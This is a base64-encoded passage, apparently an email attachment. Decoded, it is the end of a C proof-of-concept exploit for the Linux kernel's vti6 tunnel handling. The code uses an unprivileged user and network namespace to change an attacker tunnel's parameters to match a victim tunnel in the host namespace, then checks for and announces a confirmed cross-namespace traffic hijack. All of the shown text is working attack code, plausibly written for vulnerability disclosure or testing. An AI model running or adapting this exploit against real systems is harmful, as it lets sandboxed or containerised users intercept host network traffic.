ICAgIHJjID0gaW9jdGwocywgU0lPQ0dFVFRVTk5FTCwgJmlmcik7CiAgICBjbG9zZShzKTsKICAg
IHJldHVybiByYzsKfQoKaW50IG1haW4odm9pZCkKewogICAgaW50IHJjOwogICAgc3RydWN0IGlw
Nl90bmxfcGFybTIgdmljdGltX3AsIGF0dGFja2VyX3AsIGxvb2t1cF9wOwoKICAgIC8qIFN0ZXAg
MTogZW5zdXJlIGNsZWFuIHN0YXRlICovCiAgICBmcHJpbnRmKHN0ZGVyciwgIlsqXSBDbGVhbiBw
cmlvciB0dW5uZWxzIChiZXN0IGVmZm9ydClcbiIpOwogICAgcnVuX2NtZCgiaXAgbGluayBkZWwg
IiBWSUNUSU1fTkFNRSAiIDI+L2Rldi9udWxsIik7CiAgICBydW5fY21kKCJpcCBsaW5rIGRlbCAi
IEFUVEFDS0VSX05BTUUgIiAyPi9kZXYvbnVsbCIpOwoKICAgIC8qIFN0ZXAgMjogY3JlYXRlIHZp
Y3RpbSB0dW5uZWwgaW4gaW5pdF9uZXQgKi8KICAgIHNldF92aWN0aW1fcGFyYW1zKCZ2aWN0aW1f
cCk7CiAgICBmcHJpbnRmKHN0ZGVyciwgIlsqXSBDcmVhdGUgdmljdGltIHR1bm5lbCAlcyB3aXRo
IGxhZGRyPWZjMDA6OjEgcmFkZHI9ZmMwMDo6YVxuIiwKICAgICAgICAgICAgVklDVElNX05BTUUp
OwogICAgcmMgPSBydW5fY21kKCJpcCAtNiB0dW5uZWwgYWRkICIgVklDVElNX05BTUUgIiBtb2Rl
IHZ0aTYgIgogICAgICAgICAgICAgICAgICJyZW1vdGUgZmMwMDo6YSBsb2NhbCBmYzAwOjoxIik7
CiAgICBpZiAocmMpIHsgZnByaW50ZihzdGRlcnIsICJbIV0gZmFpbGVkIHRvIGNyZWF0ZSB2aWN0
aW0gdHVubmVsXG4iKTsgcmV0dXJuIDI7IH0KICAgIHJ1bl9jbWQoImlwIGxpbmsgc2V0ICIgVklD
VElNX05BTUUgIiB1cCIpOwoKICAgIC8qIFN0ZXAgMzogY3JlYXRlIGF0dGFja2VyIHR1bm5lbCBp
biBpbml0X25ldCAod2l0aCBkaWZmZXJlbnQgcGFyYW1zKSAqLwogICAgc2V0X2F0dGFja2VyX3Bh
cmFtcygmYXR0YWNrZXJfcCk7CiAgICBmcHJpbnRmKHN0ZGVyciwgIlsqXSBDcmVhdGUgYXR0YWNr
ZXIgdHVubmVsICVzIHdpdGggbGFkZHI9ZmMwMDo6MTAwIHJhZGRyPWZjMDA6OjIwMFxuIiwKICAg
ICAgICAgICAgQVRUQUNLRVJfTkFNRSk7CiAgICByYyA9IHJ1bl9jbWQoImlwIC02IHR1bm5lbCBh
ZGQgIiBBVFRBQ0tFUl9OQU1FICIgbW9kZSB2dGk2ICIKICAgICAgICAgICAgICAgICAicmVtb3Rl
IGZjMDA6OjIwMCBsb2NhbCBmYzAwOjoxMDAiKTsKICAgIGlmIChyYykgeyBmcHJpbnRmKHN0ZGVy
ciwgIlshXSBmYWlsZWQgdG8gY3JlYXRlIGF0dGFja2VyIHR1bm5lbFxuIik7IHJldHVybiAyOyB9
CgogICAgLyogU3RlcCA0OiBmb3JrIHRoZSBhdHRhY2tlciBjaGlsZCAqLwogICAgaW50IHAyY1sy
XSwgYzJwWzJdOwogICAgaWYgKHBpcGUocDJjKSB8fCBwaXBlKGMycCkpIHsgcGVycm9yKCJwaXBl
Iik7IHJldHVybiAyOyB9CiAgICBwaWRfdCBjcGlkID0gZm9yaygpOwogICAgaWYgKGNwaWQgPCAw
KSB7IHBlcnJvcigiZm9yayIpOyByZXR1cm4gMjsgfQoKICAgIGlmIChjcGlkID09IDApIHsKICAg
ICAgICAvKiA9PT0gQ0hJTEQgPT09ICovCiAgICAgICAgY2xvc2UocDJjWzFdKTsgY2xvc2UoYzJw
WzBdKTsKICAgICAgICBpZiAodW5zaGFyZShDTE9ORV9ORVdVU0VSIHwgQ0xPTkVfTkVXTkVUKSA8
IDApIHsKICAgICAgICAgICAgcGVycm9yKCJbY2hpbGRdIHVuc2hhcmUoTkVXVVNFUnxORVdORVQp
Iik7IF9leGl0KDIpOwogICAgICAgIH0KICAgICAgICBjaGFyIGJbNjRdOyBpbnQgZmQsIG47CiAg
ICAgICAgaWYgKChmZCA9IG9wZW4oIi9wcm9jL3NlbGYvc2V0Z3JvdXBzIiwgT19XUk9OTFkpKSA+
PSAwKSB7CiAgICAgICAgICAgIHdyaXRlKGZkLCAiZGVueSIsIDQpOyBjbG9zZShmZCk7CiAgICAg
ICAgfQogICAgICAgIGZkID0gb3BlbigiL3Byb2Mvc2VsZi91aWRfbWFwIiwgT19XUk9OTFkpOwog
ICAgICAgIG4gPSBzbnByaW50ZihiLCBzaXplb2YoYiksICIwIDAgMVxuIik7IHdyaXRlKGZkLCBi
LCBuKTsgY2xvc2UoZmQpOwogICAgICAgIGZkID0gb3BlbigiL3Byb2Mvc2VsZi9naWRfbWFwIiwg
T19XUk9OTFkpOwogICAgICAgIG4gPSBzbnByaW50ZihiLCBzaXplb2YoYiksICIwIDAgMVxuIik7
IHdyaXRlKGZkLCBiLCBuKTsgY2xvc2UoZmQpOwoKICAgICAgICBjaGFyIG5zYVs2NF07IGludCBy
bCA9IHJlYWRsaW5rKCIvcHJvYy9zZWxmL25zL25ldCIsIG5zYSwgNjMpOwogICAgICAgIGlmIChy
bCA+IDApIG5zYVtybF0gPSAwOwogICAgICAgIGZwcmludGYoc3RkZXJyLCAiW2NoaWxkXSB1aWQ9
JXUgbmV0bnM9JXNcbiIsIGdldHVpZCgpLCBuc2EpOwoKICAgICAgICAvKiBUZWxsIHBhcmVudCB0
byBtaWdyYXRlIGF0dGFja2VyIHR1bm5lbCBoZXJlICovCiAgICAgICAgd3JpdGUoYzJwWzFdLCAi
UkVBRFkiLCA1KTsKICAgICAgICBjaGFyIHRtcFs4XTsKICAgICAgICByZWFkKHAyY1swXSwgdG1w
LCBzaXplb2YodG1wKSk7CiAgICAgICAgZnByaW50ZihzdGRlcnIsICJbY2hpbGRdIGF0dGFja2Vy
IHR1bm5lbCBtaWdyYXRlZCB0byBteSBuZXRuc1xuIik7CgogICAgICAgIC8qIENvbmZpcm0gd2Ug
c2VlIGF0dGFja2VyIHR1bm5lbCBoZXJlICovCiAgICAgICAgcnVuX2NtZCgiaXAgbGluayBzaG93
ICIgQVRUQUNLRVJfTkFNRSAiIDI+JjEgfCBoZWFkIC0xIik7CgogICAgICAgIC8qIElzc3VlIFNJ
T0NDSEdUVU5ORUwgb24gYXR0YWNrZXIgZGV2IHdpdGggVklDVElNIHBhcmFtcyAqLwogICAgICAg
IHN0cnVjdCBpcDZfdG5sX3Bhcm0yIG5ld19wOwogICAgICAgIHNldF92aWN0aW1fcGFyYW1zKCZu
ZXdfcCk7CiAgICAgICAgZnByaW50ZihzdGRlcnIsICJbY2hpbGRdIFNJT0NDSEdUVU5ORUw6IGNo
YW5nZSAlcyBwYXJhbXMgdG8gdmljdGltJ3MgIgogICAgICAgICAgICAgICAgIihsYWRkcj1mYzAw
OjoxIHJhZGRyPWZjMDA6OmEpXG4iLCBBVFRBQ0tFUl9OQU1FKTsKICAgICAgICByYyA9IGRvX2No
Z190dW5uZWwoQVRUQUNLRVJfTkFNRSwgJm5ld19wKTsKICAgICAgICBpZiAocmMgPCAwKQogICAg
ICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIltjaGlsZF0gU0lPQ0NIR1RVTk5FTCByYz0lZCBlcnJu
bz0lZCAoJXMpXG4iLAogICAgICAgICAgICAgICAgICAgIHJjLCBlcnJubywgc3RyZXJyb3IoZXJy
bm8pKTsKICAgICAgICBlbHNlCiAgICAgICAgICAgIGZwcmludGYoc3RkZXJyLCAiW2NoaWxkXSBT
SU9DQ0hHVFVOTkVMIHN1Y2NlZWRlZFxuIik7CgogICAgICAgIC8qIFRlbGwgcGFyZW50IHdlIGFy
ZSBkb25lICovCiAgICAgICAgd3JpdGUoYzJwWzFdLCAiRE9ORSIsIDQpOwogICAgICAgIC8qIFN0
YXkgYWxpdmUgc28gYXR0YWNrZXIgZGV2IC8gbmV0bnMgcGVyc2lzdHMgZm9yIHBhcmVudCdzIGNo
ZWNrICovCiAgICAgICAgY2hhciB3YWl0WzhdOwogICAgICAgIHJlYWQocDJjWzBdLCB3YWl0LCBz
aXplb2Yod2FpdCkpOwogICAgICAgIF9leGl0KDApOwogICAgfQoKICAgIC8qID09PSBQQVJFTlQg
PT09ICovCiAgICBjbG9zZShwMmNbMF0pOyBjbG9zZShjMnBbMV0pOwogICAgY2hhciB0bXBbOF07
CiAgICByZWFkKGMycFswXSwgdG1wLCBzaXplb2YodG1wKSk7IC8qIHdhaXQgZm9yIGNoaWxkIFJF
QURZICovCiAgICBmcHJpbnRmKHN0ZGVyciwgIltwYXJlbnRdIG1pZ3JhdGluZyAlcyB0byBjaGls
ZCBuZXRucyAocGlkPSVkKVxuIiwKICAgICAgICAgICAgQVRUQUNLRVJfTkFNRSwgY3BpZCk7CiAg
ICBjaGFyIG1pZ3JhdGVfY21kWzEyOF07CiAgICBzbnByaW50ZihtaWdyYXRlX2NtZCwgc2l6ZW9m
KG1pZ3JhdGVfY21kKSwKICAgICAgICAgICAgICJpcCBsaW5rIHNldCAiIEFUVEFDS0VSX05BTUUg
IiBuZXRucyAlZCIsIGNwaWQpOwogICAgcmMgPSBydW5fY21kKG1pZ3JhdGVfY21kKTsKICAgIGlm
IChyYykgeyBmcHJpbnRmKHN0ZGVyciwgIltwYXJlbnRdIG1pZ3JhdGlvbiBmYWlsZWRcbiIpOyBr
aWxsKGNwaWQsU0lHS0lMTCk7IHJldHVybiAyOyB9CgogICAgd3JpdGUocDJjWzFdLCAiR08iLCAy
KTsKICAgIHJlYWQoYzJwWzBdLCB0bXAsIHNpemVvZih0bXApKTsgLyogd2FpdCBmb3IgY2hpbGQg
RE9ORSAqLwoKICAgIC8qIE5vdyBjaGVjayBpbml0X25ldCdzIGhhc2ggZm9yIHZpY3RpbSBwYXJh
bXMgKi8KICAgIGZwcmludGYoc3RkZXJyLCAiXG5bKl0gVmVyaWZpY2F0aW9uOiBTSU9DR0VUVFVO
TkVMIGluIGluaXRfbmV0IG9uICIKICAgICAgICAgICAgInBhcmFtcz1mYzAwOjoxL2ZjMDA6OmFc
biIpOwogICAgc2V0X3ZpY3RpbV9wYXJhbXMoJnZpY3RpbV9wKTsKICAgIHJjID0gZG9fZ2V0X3R1
bm5lbF92aWFfZmIoJnZpY3RpbV9wLCAmbG9va3VwX3ApOwogICAgaWYgKHJjIDwgMCkgewogICAg
ICAgIGZwcmludGYoc3RkZXJyLCAiW3BhcmVudF0gU0lPQ0dFVFRVTk5FTCByYz0lZCBlcnJubz0l
ZCAoJXMpXG4iLAogICAgICAgICAgICAgICAgcmMsIGVycm5vLCBzdHJlcnJvcihlcnJubykpOwog
ICAgfSBlbHNlIHsKICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIltwYXJlbnRdIFNJT0NHRVRUVU5O
RUwgcmV0dXJuZWQgdHVubmVsIG5hbWU9JyVzJ1xuIiwKICAgICAgICAgICAgICAgIGxvb2t1cF9w
Lm5hbWUpOwogICAgICAgIGlmIChzdHJjbXAobG9va3VwX3AubmFtZSwgQVRUQUNLRVJfTkFNRSkg
PT0gMCkgewogICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIlxuKioqIEhJSkFDSyBDT05GSVJN
RUQ6IGluaXRfbmV0J3MgdnRpNiBoYXNoIGZvciAiCiAgICAgICAgICAgICAgICAgICAgInBhcmFt
cz1mYzAwOjoxL2ZjMDA6OmEgbm93IHJlc29sdmVzIHRvIGF0dGFja2VyIGRldiAnJXMnICIKICAg
ICAgICAgICAgICAgICAgICAiKHdhcyAnJXMnKS4gQ3Jvc3MtbmV0bnMgdHJhZmZpYy1oaWphY2sg
d2luZG93IGlzIHJlYWwuICoqKlxuIiwKICAgICAgICAgICAgICAgICAgICBBVFRBQ0tFUl9OQU1F
LCBWSUNUSU1fTkFNRSk7CiAgICAgICAgfSBlbHNlIGlmIChzdHJjbXAobG9va3VwX3AubmFtZSwg
VklDVElNX05BTUUpID09IDApIHsKICAgICAgICAgICAgZnByaW50ZihzdGRlcnIsICJcbltPS10g
Tm8gaGlqYWNrOiBpbml0X25ldCBoYXNoIHN0aWxsIHJlc29sdmVzIHRvICIKICAgICAgICAgICAg
ICAgICAgICAidmljdGltICclcycuIEVpdGhlciB0aGUgU0lPQ0NIR1RVTk5FTCBmYWlsZWQsIG9y
IHRoZSBrZXJuZWwgIgogICAgICAgICAgICAgICAgICAgICJoYXMgYSBndWFyZCBub3QgdmlzaWJs
ZSBmcm9tIGNvZGUgcmVhZGluZy5cbiIsCiAgICAgICAgICAgICAgICAgICAgVklDVElNX05BTUUp
OwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGZwcmludGYoc3RkZXJyLCAiXG5bP10gVW5l
eHBlY3RlZCBuYW1lPSclcydcbiIsIGxvb2t1cF9wLm5hbWUpOwogICAgICAgIH0KICAgIH0KCiAg
ICB3cml0ZShwMmNbMV0sICJFWElUIiwgNCk7IC8qIGxldCBjaGlsZCBleGl0ICovCiAgICBpbnQg
c3Q7IHdhaXRwaWQoY3BpZCwgJnN0LCAwKTsKCiAgICAvKiBDbGVhbnVwICovCiAgICBydW5fY21k
KCJpcCBsaW5rIGRlbCAiIFZJQ1RJTV9OQU1FICIgMj4vZGV2L251bGwiKTsKICAgIC8qIGF0dGFj
a2VyIGRldiBpcyBpbiBjaGlsZCdzIG5ldG5zIHdoaWNoIGV4aXRlZDsgc2hvdWxkIGJlIGNsZWFu
ZWQgdXAgYXV0byAqLwoKICAgIHJldHVybiAwOwp9Cg==
--00000000000020c41f0650f7868d--

